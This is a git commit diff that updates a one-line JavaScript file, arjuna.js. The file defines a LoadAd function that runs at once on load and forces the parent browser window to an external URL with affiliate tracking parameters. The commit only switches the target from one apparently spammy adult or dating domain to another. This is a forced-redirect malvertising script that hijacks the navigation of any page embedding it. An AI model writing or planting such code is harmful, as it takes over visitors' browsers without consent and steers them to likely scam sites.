926fcbfbc7483a5fcca1418301bd04dbedea71bf
bloggerenka <121873699+bloggerenka@users.noreply.github.com>
2026-08-20 17:19:25 +0700

    Update arjuna.js

--- arjuna.js
+++ arjuna.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://oggoel.desiirefinder.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=181648&s2=2250616&s3=Arjuna"; } LoadAd();
+function LoadAd() { parent.location.href="https://oggoel.seccretaffair.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=181648&s2=2250616&s3=Arjuna"; } LoadAd();
